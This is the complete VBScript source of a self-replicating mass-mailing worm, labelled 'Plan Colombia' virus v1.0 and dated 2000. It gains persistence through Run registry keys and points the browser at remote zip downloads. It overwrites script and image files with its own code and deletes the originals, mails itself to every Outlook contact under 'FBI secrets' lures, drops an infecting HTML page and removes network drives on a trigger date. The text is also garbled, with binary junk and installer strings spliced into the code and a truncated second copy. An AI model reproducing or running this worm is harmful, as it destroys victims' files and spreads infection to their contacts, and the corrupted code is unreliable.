rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP."
 Else
  If numero = 2 Then
    polye = ".JPG"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrl{ A 1 D 9 0 3 6 7 - F 5 1 0 - 4 9 A 7 - A 0 6 C - 0 3 E F E F F 6 D B 0 D } I-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                                    D      €?          —Ä      €¿          —D        .ùä>.ùd¿#±Ã       .ùä¾.ùd?#±C   O¢y¿¥ğb>    ùæGD   O¢y?¥ğb¾    ùæGÄ   O¢y?¥ğb>    Ùè¸Ä   O¢y¿¥ğb¾    Ùè¸D   O¢y?¥ğb>    7Ù¶Ä   O¢y¿¥ğb¾    7Ù¶D   O¢y¿¥ğb>    ÖÇKD   O¢y?¥ğb¾    ÖÇKÄ       .ùä>.ùd¿</cÃ       .ùä¾.ùd?</cC     €?         à”Ä      €¿         à”D    O¢y?¥ğb>    ”É´Ä   O¢y¿¥ğb¾    ”É´D   O¢y¿¥ğb>    çOD   O¢y?¥ğb¾    çOÄ       .ùä>.ùd¿¸¡cÃ       .ùä¾.ùd?¸¡cC     €?         à–Ä      €¿         à–D        .ùä>.ùd¿Ï~qÃ F T P   E x p l o r e r €?          šÄ      €¿          šD          €?      µÄ         €¿      µD     €?          ŸÄ      €¿          ŸD      €?          Ä      €¿          D          €?      ·Ä         €¿      ·D     €?          ›Ä      €¿          ›D          €?     à¬Ä         €¿     à¬D         €?     à®Ä         €¿     à®D         €?     €EÄ         €¿     €ED         €?     €IÄ         €¿     €ID       .ùä¾.ùd¿™FD       .ùä>.ùd?™FÄ   O¢y?¥ğb¾    í¿oÄ   O¢y¿¥ğb>    í¿oD   O¢y¿¥ğb¾    È:¥D   O¢y?¥ğb>    È:¥Ä         €?      KÄ         €¿      KD         €?     €AÄ         €¿     €AD         €?      OÄ         €¿      OD   O¢y¿¥ğb¾    $§D   O¢y?¥ğb>    $§Ä   O¢y?¥ğb¾    ×®kÄ   O¢y¿¥ğb>    ×®kD       .ùä¾.ùd¿½ND       .ùä>.ùd?½NÄ     €?         `Ä      €¿         `D          €?     €=Ä         €¿     €=D         €?      SÄ         €¿      SD   O¢y¿¥ğb¾    Â3©D   O¢y?¥ğb>    Â3©Ä   O¢y?¥ğb¾    ‘gÄ   O¢y¿¥ğb>    ‘gD       .ùä¾.ùd¿ñMD       .ùä>.ùd?ñMÄ     €?         `Ä      €¿         `D        .ùä¾.ùd¿ØyJD       .ùä>.ùd?ØyJÄ     €?         @‘Ä      €¿         @‘D      €?          “Ä      €¿          “D      €?          •Ä      €¿          •D      €?         @Ä      €¿         @D      €?          —Ä      €¿          —D      €?         @Ä      €¿         @D          €?     @vÄ         €¿     @vD         €?     @zÄ         €¿     @zD         €?     @~Ä         €¿     @~D         €?     @rÄ         €¿     @rD         €?     @nÄ         €¿     @nD   ¼çÜ¾    Eòf¿ZÊkD   ¼çÜ>    Eòf?ZÊkÄ   (‡Y¾;(z¿    ¾¬D   (‡Y>;(z?    ¾¬Ä   (‡Y¾;(z?    àÓeÄ   (‡Y>;(z¿    àÓeD     €?         `„Ä      €¿         `„D      €?         `‚Ä      €¿         `‚D    (‡Y¾;(z?    uÂaÄ   (‡Y>;(z¿    uÂaD   (‡Y¾;(z¿    ƒ§®D   (‡Y>;(z?    ƒ§®Ä   ¼çÜ¾    Eòf¿š§sD   ¼çÜ>    Eòf?š§sÄ         €?     @Ä         €¿     @D             €? ÀÄ             €¿ ÀD     €?         `€Ä      €¿         `€D      €?         @‹Ä      €¿         @‹D    (‡Y¾;(z?    ±]Ä   (‡Y>;(z¿    ±]D   (‡Y¾;(z¿    8°°D   (‡Y>;(z?    8°°Ä   ¼çÜ¾    Eòf¿òsD   ¼çÜ>    Eòf?òsÄ         €?     @Ä         €¿     @D   ¼çÜ¾    Eòf¿ĞpD   ¼çÜ>    Eòf?ĞpÄ   ¼çÜ>    Eòf¿˜)ƒÂ   ¼çÜ¾    Eòf?˜)ƒB   (‡Y>;(z?    Îß°Ä   (‡Y¾;(z¿    Îß°D   (‡Y>;(z¿    V]D   (‡Y¾;(z?    V]Ä     €?         àŸÄ      €¿         àŸD      €?         à¡Ä      €¿         à¡D    (‡Y>;(z¿    Ïó`D   (‡Y¾;(z?    Ïó`Ä   (‡Y>;(z?    LĞ®Ä   (‡Y¾;(z¿    LĞ®D   ¼çÜ>    Eòf¿aÅÂ   ¼çÜ¾    Eòf?aÅB         €?     à•Ä         €¿     à•D     €?          ™Ä      €¿          ™D    (‡Y>;(z¿    9eD   (‡Y¾;(z?    9eÄ   (‡Y>;(z?    —Ç¬Ä   (‡Y¾;(z¿    —Ç¬D   ¼çÜ>    Eòf¿Ù	Â   ¼çÜ¾    Eòf?Ù	B         €?     à—Ä         €¿     à—D   ¼çÜ>    Eòf¿ò@Â   ¼çÜ¾    Eòf?ò@B         €?     `˜Ä         €¿     `˜D         €?     `–Ä         €¿     `–D         €?     `”Ä         €¿     `”D         €?      Ä         €¿      D         €?      Ä         €¿      D         €?      ‘Ä         €¿      ‘D     €?         `˜Ä      €¿         `˜D          €?      ‹Ä         €¿      ‹D         €?     `šÄ         €¿     `šD     €?         `–Ä      €¿         `–D          €?      ‰Ä         €¿      ‰D         €?     `œÄ         €¿     `œD     €?         `”Ä      €¿         `”D      €?         à‹Ä      €¿         à‹D      €?         àÄ      €¿         àD      €?         àÄ      €¿         àD              €? ÀÄ             €¿ ÀD     €?          ŒÄ      €¿          ŒD      €?          —Ä      €¿          —D      rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of AndreasJ a c o b rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP."
 Else
  If numero = 2 Then
    polye = ".JPG"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GA D D L O C A L = D e f a u l t F e a t u r e   f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlT A R G E T D I R = " C : \ P r o g r a m \ F T P   E x p l o r e r \ "   S o u r c e D i r = " C : \ W I N D O W S \ T E M P \ W Z S E 0 . T M P \ "   @-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
